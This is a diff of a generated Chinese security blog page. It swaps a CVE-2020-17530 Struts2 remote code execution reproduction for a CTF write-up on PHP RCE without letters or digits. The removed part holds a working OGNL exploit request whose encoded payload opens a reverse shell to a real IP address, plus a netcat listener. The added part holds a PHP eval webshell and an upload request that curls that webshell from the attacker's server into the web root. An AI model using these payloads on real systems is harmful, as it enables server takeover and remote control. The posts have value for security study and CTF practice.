@@ -21,22 +21,21 @@
     var CONFIG = {"hostname":"as1def.github.io","root":"/","scheme":"Gemini","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":9},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2020-17530 Struts远程代码执行">
-<meta property="og:url" content="https://as1def.github.io/2020/12/28/CVE-2020-17530-Struts%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+  <meta name="description" content="如果遇到需要getshell的题目，但构造的webshell不能含有字母和数字，该怎么利用？常用的方式有，可以对变量进行变形、异或、取反等操作，最后动态执行函数。但若可供输入的字符更局限呢？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从一道CTF题理解无字母数字RCE">
+<meta property="og:url" content="https://as1def.github.io/2020/05/11/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%90%86%E8%A7%A3%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/index.html">
 <meta property="og:site_name" content="As1def&#39;s Blog">
+<meta property="og:description" content="如果遇到需要getshell的题目，但构造的webshell不能含有字母和数字，该怎么利用？常用的方式有，可以对变量进行变形、异或、取反等操作，最后动态执行函数。但若可供输入的字符更局限呢？">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2021/04/02/OPgoCcQp8ebkN5q.png">
-<meta property="og:image" content="https://i.loli.net/2021/04/02/aMfJzOwtpWD435m.png">
-<meta property="og:image" content="https://i.loli.net/2021/04/02/TwcJMedijk2H1y6.png">
-<meta property="article:published_time" content="2020-12-28T06:03:25.000Z">
-<meta property="article:modified_time" content="2021-04-02T14:05:04.680Z">
+<meta property="article:published_time" content="2020-05-11T15:00:11.000Z">
+<meta property="article:modified_time" content="2021-06-06T15:10:17.090Z">
 <meta property="article:author" content="As1def">
-<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/04/02/OPgoCcQp8ebkN5q.png">
 
-<link rel="canonical" href="https://as1def.github.io/2020/12/28/CVE-2020-17530-Struts%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="https://as1def.github.io/2020/05/11/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%90%86%E8%A7%A3%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/">
 
 
 <script id="page-configurations">
@@ -49,7 +48,7 @@
   };
 </script>
 
-  <title>CVE-2020-17530 Struts远程代码执行 | As1def's Blog</title>
+  <title>从一道CTF题理解无字母数字RCE | As1def's Blog</title>
   
 
 
@@ -196,7 +195,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2020/12/28/CVE-2020-17530-Struts%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+    <link itemprop="mainEntityOfPage" href="https://as1def.github.io/2020/05/11/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%90%86%E8%A7%A3%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -209,7 +208,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CVE-2020-17530 Struts远程代码执行
+          从一道CTF题理解无字母数字RCE
         </h1>
 
         <div class="post-meta">
@@ -219,14 +218,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-12-28 14:03:25" itemprop="dateCreated datePublished" datetime="2020-12-28T14:03:25+08:00">2020-12-28</time>
+              <time title="创建时间：2020-05-11 23:00:11" itemprop="dateCreated datePublished" datetime="2020-05-11T23:00:11+08:00">2020-05-11</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-02 22:05:04" itemprop="dateModified" datetime="2021-04-02T22:05:04+08:00">2021-04-02</time>
+                <time title="修改时间：2021-06-06 23:10:17" itemprop="dateModified" datetime="2021-06-06T23:10:17+08:00">2021-06-06</time>
               </span>
 
           
@@ -242,7 +241,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
+              <span>2.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -261,38 +260,46 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><img src="https://i.loli.net/2021/04/02/OPgoCcQp8ebkN5q.png" alt="image-20210402220435850"></p>
+        <p>如果遇到需要getshell的题目，但构造的webshell不能含有字母和数字，该怎么利用？常用的方式有，可以对变量进行变形、异或、取反等操作，最后动态执行函数。但若可供输入的字符更局限呢？</p>
 <a id="more"></a>
 
-<h3 id="CVE-2020-17530：Struts2远程代码执行漏洞"><a href="#CVE-2020-17530：Struts2远程代码执行漏洞" class="headerlink" title="CVE-2020-17530：Struts2远程代码执行漏洞"></a>CVE-2020-17530：Struts2远程代码执行漏洞</h3><h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h4><p>2020年12月08日，360CERT监测发现 <code>struts2</code> 发布了 <code>struts2 代码执行漏洞</code> 的风险通告，该漏洞编号为 <code>CVE-2020-17530</code> ，漏洞等级：<code>高危</code> ，漏洞评分：<code>7.5</code> 。</p>
-<p>在特定的环境下，远程攻击者通过构造 <code>恶意的OGNL表达式</code> ,可造成 <code>任意代码执行</code> 。</p>
-<h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Struts 2.0.0 – Struts 2.5.25</p>
-<h4 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h4><p>docker-compose.yml</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">struts2:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/struts2:2.5.25</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"8080:8080"</span></span><br></pre></td></tr></table></figure></div>
+<p>总结了一下关于无字母数字的RCE利用方式，类似的姿势还有很多，p神的文章有对此很清楚的讲解：</p>
+<p><code>https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</code></p>
+<p><strong>预备知识</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一些不包含数字和字母的 webshell</span><br><span class="line">https:<span class="regexp">//</span>www.leavesongs.com<span class="regexp">/PENETRATION/</span>webshell-without-alphanum.html</span><br><span class="line"></span><br><span class="line">无字母数字 webshell 之提高篇</span><br><span class="line">https:<span class="regexp">//</span>www.leavesongs.com<span class="regexp">/PENETRATION/</span>webshell-without-alphanum-advanced.html</span><br></pre></td></tr></table></figure></div>
 
-<p>1、启动strusts 2.5.25环境</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>
+<p>php中很多时候会过滤大量的字符，导致根本无法进行正常的RCE利用，也因此会出现很多通过取反、异或、递增来构造想利用的php代码。</p>
+<p>除此之外，最近看到一个题目，利用方法很是有趣</p>
+<p>CTFshow 红包题目第二弹</p>
+<p>源码如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">    $cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-oq-z0-9$]+/"</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"cerror"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\'|\"|\:|\,/"</span>,$cmd))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"serror"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>($cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
-<p>2、容器启动后，访问首页：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//your_ip:8080/index.action</span></span><br></pre></td></tr></table></figure></div>
+<p>题目 ban 掉了除小写 p 以外的所有数字字母，以及所有位运算符和 $ _ 括号等符号</p>
+<p>这个题目问题在于，在不能使用 echo() print() var_dump() 等函数的情况下如何输出？</p>
+<p>我们都知道 php 代码以 &lt;?php 作为开头，也可以简写为 &lt;?，不过这是由 php 的配置文件决定的，在 short_open_tag 开放的情况下可以使用 &lt;? 代替 &lt;?php</p>
+<p>但是这个和输出没啥关系。这里实际想提到的是另一个短开标签：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="string">"your_ip"</span>;</span><br></pre></td></tr></table></figure></div>
 
-<p><img src="https://i.loli.net/2021/04/02/aMfJzOwtpWD435m.png" alt="image-20210402140658938"></p>
-<h4 id="0x04-漏洞详情"><a href="#0x04-漏洞详情" class="headerlink" title="0x04 漏洞详情"></a>0x04 漏洞详情</h4><p>Struts在某些情况下可能存在OGNL表达式注入漏洞，如果开发人员使用了 %{…} 语法进行强制OGNL解析，某些特殊的TAG属性可能会被双重解析。攻击者可以通过构造恶意的OGNL表达式来利用此漏洞，最终造成远程代码执行。</p>
-<h4 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h4><p>以POST方式发送如下数据包，而后进行反弹shell</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 116.62.180.141:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data;boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF </span><br><span class="line"><span class="attribute">Content-Length</span>: 921</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id" </span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash-c&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTgwLjE0MS81MDA1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+<p>实际上，&lt;?= 是 echo() 的别名用法，并且在 php7 的情况下无论 short_open_tag 是否开了都可以使用。</p>
+<p>在本题目环境实际使用的过程中，直接 <code>&lt;?=</code> 还是不够的，需要先<code>?&gt;</code>把前面的 <code>&lt;?php</code> 给闭合掉才可以：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`ls`;</span><br></pre></td></tr></table></figure></div>
 
-<p><img src="https://i.loli.net/2021/04/02/TwcJMedijk2H1y6.png" alt="image-20210402210826102"></p>
-<p>2、反弹shell部分</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#arglist.add(<span class="string">"bash -c&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC95b3VyX2lwL3BvcnQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>)).(#execute=#instancemanager.newInstance(<span class="string">"freemarker.template.utility.Execute"</span>))</span><br></pre></td></tr></table></figure></div>
+<p><strong>通配符与无字母数组命令执行</strong></p>
+<p>命令执行的条件是需要我们有命令的写入，我们可以把命令写到一个文件里，文件的类型是任意的</p>
+<p>由于php 的上传机制和临时文件，我们可以对这个 php 文件进行文件上传，那么就会生成一个名为 phpXXXXXX 的临时文件，虽然它会在这个脚本结束时被清理，但是我们可以在上传的同时执行它那么就会执行成功。</p>
+<p>php上传机制中，上传什么就会在临时文件中保存什么。</p>
+<p>在题目中由于正则的匹配就算是知道临时文件的文件名也没法用，更何况也不知道文件名。不过我们知道临时文件的命名规则，还能用小写 p，还能用通配符。关于通配符说白了就是用？或 * 进行文件名匹配，题目 ban 掉了 * 但是还可以用问号：</p>
+<p>因此，我们可以用 <code>/???/p?p??????</code>表示这个临时文件</p>
+<p><strong>Getshell</strong></p>
+<p>首先我们在自己的vps上放个木马</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
 
-<p>base64部分为linux执行反弹shell的命令：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+<p>然后 curl 这个一句话并输出到网站根目录下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//y</span>our_vps<span class="regexp">/dd.txt &gt;&gt; /</span>var<span class="regexp">/www/</span>html<span class="regexp">/Demo.php</span></span><br></pre></td></tr></table></figure></div>
 
-<p>3、攻击机端口监听</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc -lvvp port</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 618a0396-811a-4d71-8a45-f1de434bde26.chall.ctf.show</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------5642920497686823912130808832</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: UM_distinctid=17424c95164f2-06a0a787df53968-4c302273-144000-17424c9516533d</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 291</span><br><span class="line"></span><br><span class="line">-----------------------------5642920497686823912130808832</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename="dd.txt"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line"></span><br><span class="line">curl http://your_vps/dd.txt &gt;&gt; /var/www/html/Demo.php</span><br><span class="line">-----------------------------5642920497686823912130808832--</span><br></pre></td></tr></table></figure>
 
-<p>发送数据包，反弹shell</p>
-<h4 id="0x06-防御措施"><a href="#0x06-防御措施" class="headerlink" title="0x06 防御措施"></a>0x06 防御措施</h4><p>Struts 2.5.25以上版本不存在该漏洞，建议升级Struts 2版本。</p>
+<p>这样就会把dd.txt里的内容以php的形式写入到网站服务器里。完成getshell。</p>
 
     </div>
 
@@ -307,7 +314,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/CVE/" rel="tag"><i class="fa fa-tag"></i> CVE</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
           </div>
 
         
@@ -316,12 +324,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/12/05/CVE-2020-14882-14883%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="CVE-2020-14882&14883漏洞分析">
-      <i class="fa fa-chevron-left"></i> CVE-2020-14882&14883漏洞分析
+    <a href="/2020/05/01/CVE-2019-18634-sudo-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="CVE-2019-18634 sudo_提权漏洞分析">
+      <i class="fa fa-chevron-left"></i> CVE-2019-18634 sudo_提权漏洞分析
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/01/17/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="Struts2 S2-061 远程命令执行">
-      Struts2 S2-061 远程命令执行 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/05/26/DASCTF-May/" rel="next" title="DASCTF-May">
+      DASCTF-May <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -381,7 +389,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-17530：Struts2远程代码执行漏洞"><span class="nav-number">1.</span> <span class="nav-text">CVE-2020-17530：Struts2远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-影响版本"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 影响版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-环境搭建"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-漏洞详情"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 漏洞详情</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-漏洞复现"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-防御措施"><span class="nav-number">1.6.</span> <span class="nav-text">0x06 防御措施</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
